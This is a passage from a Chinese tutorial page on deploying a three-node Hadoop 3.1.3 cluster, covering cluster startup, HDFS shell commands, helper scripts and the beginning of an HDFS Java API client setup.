/opt/module/hadoop-3.1.3/etc/hadoop/workers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在该文件中增加如下内容：</p><pre><code>hadoop102hadoop103hadoop104</code></pre><p>注意：该文件中添加的内容结尾不允许有空格，文件中不允许有空行。</p><p>同步所有节点配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ xsync /opt/module/hadoop-3.1.3/etc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2）启动集群</strong></p><p>​    （1）如果集群是第一次启动，需要在hadoop102节点格式化NameNode（注意格式化NameNode，会产生新的集群id，导致NameNode和DataNode的集群id不一致，集群找不到已往数据。如果集群在运行过程中报错，需要重新格式化NameNode的话，一定要先停止namenode和datanode进程，并且要删除所有机器的data和logs目录，然后再进行格式化。）</p><pre><code>[root@hadoop102 ~]$ hdfs namenode -format</code></pre><p>（2）启动HDFS</p><pre><code>[root@hadoop102 hadoop-3.1.3]$ sbin/start-dfs.sh</code></pre><p>（3）在配置了ResourceManager的节点（hadoop103）启动YARN</p><pre><code>[root@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh</code></pre><p>（4）Web端查看HDFS的NameNode</p><p>​    （a）浏览器中输入：<a href="http://hadoop102:9870/">http://hadoop102:9870</a></p><p>​    （b）查看HDFS上存储的数据信息</p><p>（5）Web端查看YARN的ResourceManager</p><p>​    （a）浏览器中输入：<a href="http://hadoop103:8088/">http://hadoop103:8088</a></p><p>​    （b）查看YARN上运行的Job信息</p><h4 id="4-2-5-集群基本测试"><a href="#4-2-5-集群基本测试" class="headerlink" title="4.2.5 集群基本测试"></a>4.2.5 集群基本测试</h4><p>HDFS相当于一个文件存储框架，搭好集群后，可以在集群去对文件进行操作，上传，下载，删除，查看等。</p><p><strong>（1）上传文件到集群</strong></p><p>​    上传小文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ hadoop fs -mkdir /input<span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ hadoop fs -put <span class="token variable">$HADOOP_HOME</span>/wcinput/word.txt /input<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    上传大文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ hadoop fs -put  /opt/software/jdk-8u212-linux-x64.tar.gz  /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>（2）上传文件后查看文件存放在什么位置</strong></p><p>（a）查看HDFS文件存储路径</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 subdir0<span class="token punctuation">]</span>$ <span class="token function">pwd</span>/opt/module/hadoop-3.1.3/data/dfs/data/current/BP-938951106-192.168.10.107-1495462844069/current/finalized/subdir0/subdir0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（b）查看HDFS在磁盘存储文件内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 subdir0<span class="token punctuation">]</span>$ <span class="token function">cat</span> blk_1073741825hadoop yarnhadoop mapreduce rootroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>（3）下载</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop104 software<span class="token punctuation">]</span>$ hadoop fs -get /jdk-8u212-linux-x64.tar.gz ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>（4）执行wordcount程序</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-6-集群启动-停止方式总结"><a href="#4-2-6-集群启动-停止方式总结" class="headerlink" title="4.2.6 集群启动/停止方式总结"></a>4.2.6 集群启动/停止方式总结</h4><p><strong>1）各个服务组件逐一启动/停止</strong></p><p>​    （1）分别启动/停止HDFS组件</p><pre class="line-numbers language-bash"><code class="language-bash">hdfs --daemon start/stop namenode/datanode/secondarynamenode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    （2）启动/停止YARN</p><pre class="line-numbers language-bash"><code class="language-bash">yarn --daemon start/stop resourcemanager/nodemanager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）各个模块分开启动/停止（配置ssh是前提）常用</p><p>​    （1）整体启动/停止HDFS</p><pre class="line-numbers language-bash"><code class="language-bash">start-dfs.sh/stop-dfs.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    （2）整体启动/停止YARN</p><pre class="line-numbers language-bash"><code class="language-bash">start-yarn.sh/stop-yarn.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-7-编写hadoop集群常用脚本"><a href="#4-2-7-编写hadoop集群常用脚本" class="headerlink" title="4.2.7 编写hadoop集群常用脚本"></a>4.2.7 编写hadoop集群常用脚本</h4><p><strong>(1）查看三台服务器java进程脚本：jpsall</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> /home/root/bin<span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ vim jpsall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后输入</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">for</span> host <span class="token keyword">in</span> hadoop102 hadoop103 hadoop104<span class="token keyword">do</span>​    <span class="token keyword">echo</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token variable">$host</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>​    <span class="token function">ssh</span> <span class="token variable">$host</span> jps <span class="token variable">$@</span> <span class="token operator">|</span> <span class="token function">grep</span> -v Jps<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存后退出，然后赋予脚本执行权限</p><p>[root@hadoop102 bin]$ chmod +x jpsall</p><p><strong>（2）hadoop集群启停脚本（包含hdfs，yarn，historyserver）：</strong>myhadoop.sh</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> /home/root/bin<span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ vim myhadoop.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后输入</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> $<span class="token comment" spellcheck="true"># -lt 1 ]</span><span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"No Args Input..."</span>  <span class="token keyword">exit</span> <span class="token punctuation">;</span><span class="token keyword">fi</span><span class="token keyword">case</span> <span class="token variable">$1</span> <span class="token keyword">in</span><span class="token string">"start"</span><span class="token punctuation">)</span>​    <span class="token keyword">echo</span> <span class="token string">" =================== 启动 hadoop集群 ==================​    echo "</span> --------------- 启动 hdfs ---------------<span class="token string">"​    ssh hadoop102 "</span>/opt/module/hadoop-3.1.3/sbin/start-dfs.sh<span class="token string">"​    echo "</span> --------------- 启动 yarn ---------------<span class="token string">"​    ssh hadoop103 "</span>/opt/module/hadoop-3.1.3/sbin/start-yarn.sh<span class="token string">"​    echo "</span> --------------- 启动 historyserver ---------------<span class="token string">"​    ssh hadoop102 "</span>/opt/module/hadoop-3.1.3/bin/mapred --daemon start historyserver<span class="token string">";;"</span>stop<span class="token string">")​    echo "</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 关闭 hadoop集群 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>​    <span class="token keyword">echo</span> <span class="token string">" --------------- 关闭 historyserver ---------------"</span>​    <span class="token function">ssh</span> hadoop102 <span class="token string">"/opt/module/hadoop-3.1.3/bin/mapred --daemon stop historyserver"</span>​    <span class="token keyword">echo</span> <span class="token string">" --------------- 关闭 yarn ---------------"</span>​    <span class="token function">ssh</span> hadoop103 <span class="token string">"/opt/module/hadoop-3.1.3/sbin/stop-yarn.sh"</span>​    <span class="token keyword">echo</span> <span class="token string">" --------------- 关闭 hdfs ---------------"</span>​    <span class="token function">ssh</span> hadoop102 <span class="token string">"/opt/module/hadoop-3.1.3/sbin/stop-dfs.sh"</span><span class="token punctuation">;</span><span class="token punctuation">;</span>*<span class="token punctuation">)</span>  <span class="token keyword">echo</span> <span class="token string">"Input Args Error..."</span><span class="token punctuation">;</span><span class="token punctuation">;</span>esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存后退出，然后赋予脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> +x myhadoop.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）分发/home/root/bin目录，保证自定义脚本在三台机器上都可以使用</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ xsync /home/root/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-hdfs常用shell操作"><a href="#5-hdfs常用shell操作" class="headerlink" title="5 hdfs常用shell操作"></a>5 hdfs常用shell操作</h2><h3 id="5-1-基本语法"><a href="#5-1-基本语法" class="headerlink" title="5.1 基本语法"></a>5.1 基本语法</h3><p>hadoop fs 具体命令  OR hdfs dfs 具体命令</p><p>两个是完全相同的。</p><h3 id="5-2-命令大全"><a href="#5-2-命令大全" class="headerlink" title="5.2 命令大全"></a>5.2 命令大全</h3><p>查看所有命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ bin/hadoop fs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-3-常用命令实操"><a href="#5-3-常用命令实操" class="headerlink" title="5.3 常用命令实操"></a>5.3 常用命令实操</h3><h4 id="5-3-1-准备工作"><a href="#5-3-1-准备工作" class="headerlink" title="5.3.1 准备工作"></a>5.3.1 准备工作</h4><p>1）启动Hadoop集群（方便后续的测试）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-dfs.sh<span class="token punctuation">[</span>root@hadoop103 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-yarn.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）-help：输出这个命令参数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -help <span class="token function">rm</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-3-2-上传"><a href="#5-3-2-上传" class="headerlink" title="5.3.2 上传"></a>5.3.2 上传</h4><p>1）-moveFromLocal：从本地剪切粘贴到HDFS</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">touch</span> kongming.txt<span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -moveFromLocal ./kongming.txt /sanguo/shuguo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）-copyFromLocal：从本地文件系统中拷贝文件到HDFS路径去</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -copyFromLocal README.txt /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）-appendToFile：追加一个文件到已经存在的文件末尾</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">touch</span> liubei.txt<span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">vi</span> liubei.txtsan gu mao lu<span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -appendToFile liubei.txt /sanguo/shuguo/kongming.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>4）-put：等同于copyFromLocal</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -put ./liubei.txt /user/root/test/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-3-3-下载"><a href="#5-3-3-下载" class="headerlink" title="5.3.3 下载"></a>5.3.3 下载</h4><p>1）-copyToLocal：从HDFS拷贝到本地</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -copyToLocal /sanguo/shuguo/kongming.txt ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）-get：等同于copyToLocal，就是从HDFS下载文件到本地</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -get /sanguo/shuguo/kongming.txt ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）-getmerge：合并下载多个文件，比如HDFS的目录 /user/root/test下有多个文件:log.1, log.2,log.3,…</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -getmerge /user/root/test/* ./zaiyiqi.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-3-4-HDFS直接操作"><a href="#5-3-4-HDFS直接操作" class="headerlink" title="5.3.4 HDFS直接操作"></a>5.3.4 HDFS直接操作</h4><p>1）-ls: 显示目录信息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -ls /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）-mkdir：在HDFS上创建目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -mkdir -p /sanguo/shuguo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）-cat：显示文件内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -cat /sanguo/shuguo/kongming.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）-chgrp 、-chmod、-chown：Linux文件系统中的用法一样，修改文件所属权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -chmod 666 /sanguo/shuguo/kongming.txt<span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -chown root:root  /sanguo/shuguo/kongming.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5）-cp ：从HDFS的一个路径拷贝到HDFS的另一个路径</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -cp /sanguo/shuguo/kongming.txt /zhuge.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6）-mv：在HDFS目录中移动文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -mv /zhuge.txt /sanguo/shuguo/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7）-tail：显示一个文件的末尾1kb的数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -tail /sanguo/shuguo/kongming.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8）-rm：删除文件或文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -rm /user/root/test/jinlian2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9）-rmdir：删除空目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -mkdir /test<span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -rmdir /test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>10）-du统计文件夹的大小信息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -du -s -h /user/root/test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>11）-setrep：设置HDFS中文件的副本数量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -setrep 10 /sanguo/shuguo/kongming.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里设置的副本数只是记录在NameNode的元数据中，是否真的会有这么多副本，还得看DataNode的数量。因为目前只有3台设备，最多也就3个副本，只有节点数的增加到10台时，副本数才能达到10。</p><h1 id="6-hdfs的API操作"><a href="#6-hdfs的API操作" class="headerlink" title="6 hdfs的API操作"></a>6 hdfs的API操作</h1><h2 id="6-1-准备Windows关于Hadoop的开发环境"><a href="#6-1-准备Windows关于Hadoop的开发环境" class="headerlink" title="6.1 准备Windows关于Hadoop的开发环境"></a>6.1 准备Windows关于Hadoop的开发环境</h2><p>1）找到资料目录下的Windows依赖目录，打开：</p><p>选择Hadoop-3.1.0，拷贝到其他地方(比如d:)。<br>2）配置HADOOP_HOME环境变量。</p><p>3）配置Path环境变量。然后重启电脑</p><p>4）创建一个Maven工程HdfsClientDemo，并导入相应的依赖坐标+日志添加</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-slf4j-impl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.12.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.hadoop<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hadoop-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span>在项目的src/main/resources目录下，新建一个文件，命名为“log4j2.xml”，在文件中填入<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span> <span class="token attr-name">strict</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XMLConfig<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 类型名为Console，名称为必须属性 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appender</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- 布局为PatternLayout的方式，            输出样式为[INFO] [2018-01-22 17:34:01][org.test.Console]I'm here --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Layout</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PatternLayout<span class="token punctuation">"</span></span>                    <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>[%p] [%d&amp;#123;yyyy-MM-dd HH:mm:ss&amp;#125;][%c&amp;#123;10&amp;#125;]%m%n<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appender</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 可加性为false --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Logger</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span> <span class="token attr-name">additivity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Logger</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- root loggerConfig设置 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）创建包名：com.atguigu.hdfs<br>6）创建HdfsClient类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HdfsClient</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testMkdirs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException<span class="token punctuation">,</span> URISyntaxException<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取文件系统</span>        Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 配置在集群上运行</span>        <span class="token comment" spellcheck="true">// configuration.set("fs.defaultFS", "hdfs://hadoop102:9820");</span>        <span class="token comment" spellcheck="true">// FileSystem fs = FileSystem.get(configuration);</span>        FileSystem fs <span class="token operator">=</span> FileSystem<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span><span class="token string">"hdfs://hadoop102:9820"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> configuration<span class="token punctuation">,</span> <span class="token string">"atguigu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 创建目录</span>        fs<span class="token punctuation">.</span><span class="token function">mkdirs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"/1108/daxian/banzhang"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 关闭资源</span>        fs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" 